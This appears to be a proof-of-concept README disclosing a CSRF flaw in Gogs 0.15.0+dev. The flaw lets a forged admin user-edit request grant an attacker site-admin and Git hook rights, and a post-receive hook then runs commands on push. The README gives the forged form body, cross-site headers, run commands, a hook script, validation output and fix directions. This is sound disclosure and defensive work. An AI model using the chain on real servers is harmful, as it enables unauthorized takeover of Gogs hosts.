# Gogs Admin User Edit CSRF to Git Hook RCE PoC

This entry documents and exercises a state-changing request flaw in Gogs `0.15.0+dev`.

An authenticated site administrator can be induced to submit the existing admin user-edit form for an attacker-controlled account. The request grants the attacker account site-admin rights and Git hook editing rights. The attacker can then write a repository `post-receive` hook through the stock Gogs hook editor and trigger command execution with a normal Git push.

## Affected Target

- Product: Gogs
- Version verified: `0.15.0+dev`
- Commit tested: `5f51118ab513522462a54cef30599d7ddffcc55f`
- Feature path: classic web admin routes and repository Git hook settings
- Required attacker account: a normal local user account
- Required victim interaction: a logged-in site administrator submits an attacker-controlled request

## Impact

The chain turns one authenticated browser request from a site administrator into command execution as the Gogs server process.

After the account mutation, the attacker account can reach site-admin pages and repository Git hook settings. A `post-receive` hook written through the stock web route runs during a later HTTP Git push.

## Source Trace

Relevant source locations in Gogs `0.15.0+dev`:

| File | Behavior |
| --- | --- |
| `cmd/gogs/internal/web/web.go` | Registers `POST /admin/users/:userid` |
| `cmd/gogs/internal/web/web.go` | Installs session and context middleware around classic web routes |
| `templates/admin/user/edit.tmpl` | Renders the admin edit form without a CSRF token field |
| `templates/admin/user/edit.tmpl` | Exposes `admin` and `allow_git_hook` checkboxes |
| `internal/form/admin.go` | Binds `Admin` and `AllowGitHook` into `AdminEditUser` |
| `internal/route/admin/users.go` | Writes `IsAdmin` and `AllowGitHook` to the selected user |
| `internal/context/repo.go` | Allows site admins through repository-admin checks |
| `internal/context/repo.go` | Allows Git hook editing when `CanEditGitHook()` is true |
| `internal/database/users.go` | Returns true for `CanEditGitHook()` when the user is admin or hook-enabled |
| `internal/route/repo/setting.go` | Writes attacker-supplied hook content |
| `cmd/gogs/hook.go` | Executes `custom_hooks/post-receive` during pushes |

The state-change path is:

```text
POST /admin/users/:userid
  bind AdminEditUser
    Admin
    AllowGitHook
  admin.EditUserPost
    database.UpdateUserOptions
      IsAdmin
      AllowGitHook
    database.Handle.Users().Update()
```

The command execution path is:

```text
POST /:owner/:repo/settings/hooks/git/post-receive
  context.RequireRepoAdmin()
  context.GitHookService()
  repo.SettingsGitHooksEditPost()
    hook.Update(content)

git push
  gogs hook post-receive
    custom_hooks/post-receive
```

## PoC Design

`poc.py` drives the stock HTTP interface and the stock Git smart HTTP path. It:

1. Starts with a normal attacker account and a logged-in site-admin session.
2. Sends the admin user-edit POST for the attacker account with cross-site request headers.
3. Logs in as the attacker and confirms the web API now reports site-admin status.
4. Creates an attacker-owned repository through `/repo/create`.
5. Writes a `post-receive` hook through `/settings/hooks/git/post-receive`.
6. Clones the repository over HTTP Git.
7. Commits and pushes a trigger file.
8. Prints the repository, marker path, Git push output, and optional local marker contents.

The script uses Python standard library APIs and the system `git` command.

## Requirements

- Python 3.10 or newer
- Git command-line client
- A running stock Gogs `0.15.0+dev` instance
- One site-admin session or site-admin username and password for validation
- One normal attacker account
- The numeric user id and email address of the attacker account
- A server-side marker path writable by the Gogs process

## Quick Run

Start from a stock Gogs instance with:

- site admin: `siteadmin` / `AdminPass123!`
- attacker: `attacker` / `AttackerPass123!`
- attacker id: `2`
- attacker email: `attacker@example.test`

Run:

```bash
python poc.py \
  --target-base http://127.0.0.1:38081 \
  --admin-user siteadmin \
  --admin-password 'AdminPass123!' \
  --attacker-user attacker \
  --attacker-password 'AttackerPass123!' \
  --attacker-id 2 \
  --attacker-email attacker@example.test \
  --repo gogs-hook-proof \
  --marker-path /tmp/gogs_hook_proof.txt \
  --output proof.json
```

Expected output shape:

```json
{
  "targetBase": "http://127.0.0.1:38081",
  "attackerUser": "attacker",
  "attackerId": 2,
  "attackerInfo": {
    "username": "attacker",
    "avatarURL": "http://127.0.0.1:38081/avatars/2",
    "isAdmin": true,
    "canCreateOrganization": true
  },
  "repository": "attacker/gogs-hook-proof",
  "markerPath": "/tmp/gogs_hook_proof.txt",
  "localMarker": null,
  "pushStdout": "",
  "pushStderr": "To http://127.0.0.1:38081/attacker/gogs-hook-proof.git\n..."
}
```

For a local validation target, pass `--local-marker` with the host path that corresponds to the server-side marker file. The script will print the marker contents after the push.

## Existing Admin Session Mode

To model a request delivered through an already-authenticated administrator browser, pass the administrator session cookie directly:

```bash
python poc.py \
  --target-base http://127.0.0.1:38081 \
  --admin-cookie 'i_like_gogs=SESSION_VALUE' \
  --attacker-user attacker \
  --attacker-password 'AttackerPass123!' \
  --attacker-id 2 \
  --attacker-email attacker@example.test \
  --marker-path /tmp/gogs_hook_proof.txt
```

The submitted admin request contains:

```text
Origin: https://example.invalid
Referer: https://example.invalid/submit.html
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
```

The form body grants both account controls:

```text
login_type=0-0
email=attacker@example.test
max_repo_creation=-1
active=on
admin=on
allow_git_hook=on
```

## Validation Run

The validation run used a clean stock Gogs checkout at `5f51118ab513522462a54cef30599d7ddffcc55f`, built as `0.15.0+dev`, running on Linux with SQLite and HTTP Git enabled.

Initial users:

```text
(1, 'siteadmin', 'siteadmin@example.test', 1, 0, 1)
(2, 'attacker', 'attacker@example.test', 0, 0, 1)
```

The forged admin POST returned a redirect to the edited attacker account, and the attacker row changed to:

```text
(2, 'attacker', 'attacker@example.test', 1, 1, 1)
```

The hook written through Gogs was:

```sh
#!/bin/sh
id > /mnt/d/gogs-proof-validation/tmp/gogs_hook_proof.txt
pwd >> /mnt/d/gogs-proof-validation/tmp/gogs_hook_proof.txt
```

A normal HTTP Git push triggered the hook and created:

```text
uid=1000(owner) gid=1000(owner) groups=1000(owner),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users)
/mnt/d/gogs-proof-validation/repositories/attacker/gogs-hook-proof.git
```

Relevant server log lines from the stock instance:

```text
Account updated by admin "siteadmin": attacker
Repository created [1]: attacker/gogs-hook-proof
[Git] Authenticated user: attacker
TriggerTask: attacker/gogs-hook-proof@master by "attacker"
```

## Browser Delivery Requirements

The server-side request accepts a valid administrator session and processes the state change without a CSRF token. Browser delivery requires the victim request to carry the administrator session cookie. Same-site origins, deployments that permit the cookie on the delivered request, and browser flows where the session cookie is sent satisfy that requirement.

## Fix Direction

- Restore server-side CSRF validation for all session-authenticated unsafe web methods.
- Include per-request CSRF tokens in classic HTML forms.
- Validate `Origin`, `Referer`, and Fetch Metadata headers for sensitive state-changing routes.
- Require a fresh confirmation step for site-admin mutations that grant admin rights, Git hook editing rights, password changes, or login-state changes.
- Keep Git hook editing behind an explicit high-risk permission boundary and audit every hook update.

## Responsible Use

Use this PoC only for systems you own, systems you are authorized to test, and defensive regression work.
